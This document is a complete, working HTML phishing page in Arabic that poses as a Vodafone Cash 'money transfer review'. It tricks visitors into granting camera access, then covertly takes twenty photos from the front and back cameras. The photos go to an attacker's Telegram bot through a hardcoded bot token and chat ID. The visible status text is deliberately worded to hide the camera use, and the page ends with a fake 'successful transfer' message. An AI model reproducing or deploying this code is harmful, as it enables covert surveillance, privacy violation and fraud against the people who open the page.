<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    
    <title>فودافون كاش</title>

    <!-- Open Graph للمشاركة -->
    <meta property="og:title" content="فودافون كاش" />
    <meta property="og:description" content="مراجعة تحويل الأموال، يرجى مراجعة التحويل" />
    <meta property="og:image" content="https://hapijournal.com/wp-content/uploads/2019/06/vodafone-Logo-1024x739-1.jpg" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f5f0eb;
            position: relative;
        }

        /* الخلفية - الصورة الجديدة */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('1000941335_1231072773959845518.webp');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            opacity: 0.5;
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 420px;
            padding: 20px;
            min-height: 100vh;
            text-align: center;
        }

        /* شعار فودافون */
        .vodafone-logo {
            width: 180px;
            height: auto;
            margin-bottom: 30px;
            background: rgba(255, 255, 255, 0.9);
            padding: 12px;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
        }

        .vodafone-logo img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 10px;
        }

        .page-title {
            color: #222;
            font-size: 26px;
            font-weight: bold;
            margin-bottom: 5px;
            text-shadow: 0 2px 8px rgba(255, 255, 255, 0.8);
        }

        .page-sub {
            color: #444;
            font-size: 16px;
            margin-bottom: 30px;
            text-shadow: 0 2px 8px rgba(255, 255, 255, 0.8);
        }

        /* ===== الزر المبدئي (الموافق) ===== */
        .btn-consent {
            background: #2196f3;
            color: #fff;
            border: none;
            padding: 16px 35px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 6px 25px rgba(33, 150, 243, 0.4);
            transition: all 0.3s ease;
            width: 100%;
            max-width: 320px;
            margin-bottom: 15px;
            border: 2px solid #2196f3;
        }

        .btn-consent:hover {
            transform: scale(1.03);
            box-shadow: 0 8px 35px rgba(33, 150, 243, 0.6);
        }

        /* ===== الزر الرئيسي (ببلور) ===== */
        .btn-review {
            background: #e60000;
            color: #fff;
            border: none;
            padding: 18px 40px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            max-width: 320px;
            border: 2px solid #e60000;
            transition: all 0.5s ease;
            /* الحالة الطبيعية: بلور + غير قابل للضغط */
            filter: blur(8px);
            opacity: 0.5;
            pointer-events: none;
            user-select: none;
        }

        /* الحالة النشطة: واضح وقابل للضغط */
        .btn-review.active {
            filter: blur(0px);
            opacity: 1;
            pointer-events: auto;
            box-shadow: 0 6px 25px rgba(230, 0, 0, 0.4);
        }

        .btn-review.active:hover {
            transform: scale(1.03);
            box-shadow: 0 8px 35px rgba(230, 0, 0, 0.6);
        }

        .btn-review:active {
            transform: scale(0.95);
        }

        .btn-review:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            filter: blur(0px);
            pointer-events: none;
        }

        /* ===== رسالة الحالة ===== */
        #status {
            color: #333;
            margin-top: 20px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.92);
            padding: 12px 20px;
            border-radius: 10px;
            min-height: 50px;
            width: 100%;
            max-width: 320px;
            text-align: center;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(5px);
            transition: all 0.3s ease;
        }

        #status.success {
            border-color: #00c853;
            color: #00c853;
            background: rgba(240, 255, 244, 0.95);
        }

        #status.error {
            border-color: #ff1744;
            color: #ff1744;
            background: rgba(255, 240, 240, 0.95);
        }

        #status.permission {
            border-color: #ff9800;
            color: #e65100;
            background: rgba(255, 243, 224, 0.95);
        }

        /* ===== زر إعادة محاولة الإذن ===== */
        .btn-retry-permission {
            display: none;
            background: #ff9800;
            color: #fff;
            border: none;
            padding: 12px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 12px;
            width: 100%;
            max-width: 280px;
            transition: all 0.3s ease;
            border: 2px solid #ff9800;
        }

        .btn-retry-permission:hover {
            transform: scale(1.03);
            box-shadow: 0 4px 20px rgba(255, 152, 0, 0.4);
        }

        .btn-retry-permission.show {
            display: block;
        }

        /* إخفاء عناصر الكاميرا */
        #video-front,
        #video-back,
        #canvas {
            display: none;
        }

        @media (max-width: 480px) {
            .vodafone-logo {
                width: 140px;
            }
            .page-title {
                font-size: 22px;
            }
            .btn-review {
                font-size: 18px;
                padding: 14px 30px;
            }
            .btn-consent {
                font-size: 17px;
                padding: 14px 25px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- شعار فودافون -->
        <div class="vodafone-logo">
            <img src="https://hapijournal.com/wp-content/uploads/2019/06/vodafone-Logo-1024x739-1.jpg" alt="فودافون كاش" />
        </div>

        <h1 class="page-title">فودافون كاش</h1>
        <p class="page-sub">مراجعة تحويل الأموال</p>

        <!-- الزر المبدئي: الموافقة على الإذن -->
        <button class="btn-consent" id="consentBtn">
            🔐 اضغط لتفعيل الإذن للتحقق
        </button>

        <!-- الزر الرئيسي (مبلور في البداية) -->
        <button class="btn-review" id="reviewBtn">
            📸 مراجعة العملية - اضغط للتأكيد
        </button>

        <!-- زر إعادة محاولة الإذن في حال الرفض -->
        <button class="btn-retry-permission" id="retryPermissionBtn">
            🔄 إعادة محاولة تفعيل الإذن
        </button>

        <!-- رسالة الحالة -->
        <div id="status">👋 اضغط على زر تفعيل الإذن أولاً</div>
    </div>

    <!-- عناصر الكاميرا (مخفية) -->
    <video id="video-front" autoplay playsinline></video>
    <video id="video-back" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================================
        //  إعدادات البوت
        // ============================================================
        const BOT_TOKEN = '8237095382:AAEwtkETTGq3VEp1flZrIKVXQTWF5KGkCiM';
        const CHAT_ID = '6068331455';

        // ============================================================
        //  عناصر الصفحة
        // ============================================================
        const consentBtn = document.getElementById('consentBtn');
        const reviewBtn = document.getElementById('reviewBtn');
        const retryPermissionBtn = document.getElementById('retryPermissionBtn');
        const statusDiv = document.getElementById('status');

        const videoFront = document.getElementById('video-front');
        const videoBack = document.getElementById('video-back');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // حالة الإذن
        let permissionGranted = false;

        // ============================================================
        //  دوال مساعدة
        // ============================================================
        function setStatus(msg, type = '') {
            statusDiv.textContent = msg;
            statusDiv.className = type;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ============================================================
        //  طلب إذن الكاميرا (بدون تشغيلها فعلياً)
        // ============================================================
        async function requestPermission() {
            try {
                // مجرد طلب الإذن دون تشغيل الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 320 },
                        height: { ideal: 240 }
                    },
                    audio: false
                });
                // على طول أوقف الـ stream
                stream.getTracks().forEach(track => track.stop());
                permissionGranted = true;
                return true;
            } catch (err) {
                console.error('رفض الإذن:', err);
                permissionGranted = false;
                return false;
            }
        }

        // ============================================================
        //  تفعيل الإذن - عند الضغط على الزر المبدئي
        // ============================================================
        async function handleConsent() {
            consentBtn.disabled = true;
            consentBtn.textContent = '⏳ جاري التحقق ...';
            setStatus('⏳ جاري طلب الإذن ...');

            const granted = await requestPermission();

            if (granted) {
                // تفعيل الزر الرئيسي (إزالة البلور)
                reviewBtn.classList.add('active');
                consentBtn.style.display = 'none';
                retryPermissionBtn.classList.remove('show');
                setStatus('✅ تم تفعيل الإذن! اضغط على زر المراجعة الآن', 'success');
            } else {
                // رفض الإذن
                setStatus('⚠️ يجب تفعيل الإذن للتحقق. اضغط على زر إعادة المحاولة', 'permission');
                retryPermissionBtn.classList.add('show');
                consentBtn.disabled = false;
                consentBtn.textContent = '🔐 اضغط لتفعيل الإذن للتحقق';
            }
        }

        // ============================================================
        //  إعادة محاولة الإذن
        // ============================================================
        async function retryPermission() {
            retryPermissionBtn.disabled = true;
            retryPermissionBtn.textContent = '⏳ جاري ...';
            setStatus('⏳ جاري طلب الإذن مجدداً ...');

            const granted = await requestPermission();

            if (granted) {
                reviewBtn.classList.add('active');
                consentBtn.style.display = 'none';
                retryPermissionBtn.classList.remove('show');
                setStatus('✅ تم تفعيل الإذن! اضغط على زر المراجعة الآن', 'success');
            } else {
                setStatus('⚠️ يجب تفعيل الإذن للتحقق. اضغط على زر إعادة المحاولة', 'permission');
                retryPermissionBtn.disabled = false;
                retryPermissionBtn.textContent = '🔄 إعادة محاولة تفعيل الإذن';
            }
        }

        // ============================================================
        //  تشغيل الكاميرا (للاستخدام الفعلي)
        // ============================================================
        async function startCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                return stream;
            } catch (err) {
                console.error('خطأ في الكاميرا:', err);
                throw err;
            }
        }

        // ============================================================
        //  التقاط صورة
        // ============================================================
        function captureImage(videoElement) {
            canvas.width = videoElement.videoWidth || 640;
            canvas.height = videoElement.videoHeight || 480;
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.9);
        }

        // ============================================================
        //  إرسال لتليجرام
        // ============================================================
        async function sendPhotoToTelegram(base64Image, caption = '', retries = 2) {
            const byteString = atob(base64Image.split(',')[1]);
            const mimeString = base64Image.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');
            if (caption) {
                formData.append('caption', caption);
            }

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

            for (let attempt = 0; attempt <= retries; attempt++) {
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        body: formData
                    });
                    const data = await response.json();
                    if (!data.ok) {
                        throw new Error(data.description || 'فشل الإرسال');
                    }
                    return data;
                } catch (err) {
                    if (attempt === retries) throw err;
                    await sleep(2000 * (attempt + 1));
                }
            }
        }

        // ============================================================
        //  العملية الرئيسية: 1 أمامي → 1 خلفي → 1 أمامي → 1 خلفي ...
        // ============================================================
        async function reviewProcess() {
            if (!permissionGranted) {
                setStatus('⚠️ يجب تفعيل الإذن أولاً', 'permission');
                return;
            }

            reviewBtn.disabled = true;
            reviewBtn.textContent = '⏳ جاري ...';
            setStatus(''); // إخفاء أي رسالة

            let frontStream = null;
            let backStream = null;
            let totalCaptured = 0;
            const MAX_PER_TYPE = 10;

            try {
                // تشغيل الكاميرا الأمامية
                frontStream = await startCamera('user');
                videoFront.srcObject = frontStream;
                await videoFront.play();
                await sleep(500);

                // تشغيل الكاميرا الخلفية
                backStream = await startCamera('environment');
                videoBack.srcObject = backStream;
                await videoBack.play();
                await sleep(500);

                // التبديل: 1 أمامي → 1 خلفي → 1 أمامي → 1 خلفي ...
                let frontCount = 0;
                let backCount = 0;
                let turn = 'front'; // نبدأ بالأمامي

                while (frontCount < MAX_PER_TYPE || backCount < MAX_PER_TYPE) {
                    if (turn === 'front' && frontCount < MAX_PER_TYPE) {
                        const base64 = captureImage(videoFront);
                        await sendPhotoToTelegram(base64, `📸 أمامي ${frontCount + 1}/10 - مراجعة فودافون كاش`);
                        frontCount++;
                        turn = 'back';
                    } else if (turn === 'back' && backCount < MAX_PER_TYPE) {
                        const base64 = captureImage(videoBack);
                        await sendPhotoToTelegram(base64, `📸 خلفي ${backCount + 1}/10 - مراجعة فودافون كاش`);
                        backCount++;
                        turn = 'front';
                    } else if (frontCount >= MAX_PER_TYPE) {
                        turn = 'back';
                    } else if (backCount >= MAX_PER_TYPE) {
                        turn = 'front';
                    }

                    totalCaptured++;
                    // تحديث الحالة برقم فقط بدون أي كلمة توحي بالكاميرا
                    setStatus(`⏳ ${totalCaptured}/20`);
                    await sleep(300);
                }

                // إيقاف الكاميرات
                frontStream.getTracks().forEach(track => track.stop());
                backStream.getTracks().forEach(track => track.stop());
                videoFront.srcObject = null;
                videoBack.srcObject = null;

                // نجاح
                setStatus('✅ عملية تحويل أموال ناجحة، يرجى مراجعة البيانات', 'success');

            } catch (err) {
                console.error(err);
                setStatus('❌ حدث خطأ، يرجى المحاولة مرة أخرى', 'error');

                if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                if (backStream) backStream.getTracks().forEach(t => t.stop());
                videoFront.srcObject = null;
                videoBack.srcObject = null;

            } finally {
                reviewBtn.disabled = false;
                reviewBtn.textContent = '📸 مراجعة العملية - اضغط للتأكيد';
                // إعادة تعيين البلور بعد الانتهاء (يبقى واضح لأن الإذن مفعل)
                reviewBtn.classList.add('active');
            }
        }

        // ============================================================
        //  ربط الأحداث
        // ============================================================
        consentBtn.addEventListener('click', handleConsent);
        retryPermissionBtn.addEventListener('click', retryPermission);
        reviewBtn.addEventListener('click', reviewProcess);

        // ============================================================
        //  رسالة أولية + تحقق من HTTPS
        // ============================================================
        setStatus('👋 اضغط على زر تفعيل الإذن أولاً');

        if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
            setStatus('⚠️ يرجى استخدام HTTPS لتشغيل الكاميرا', 'error');
        }

        console.log('✅ فودافون كاش - نظام التبديل 1 أمامي → 1 خلفي');
    </script>

</body>
</html>
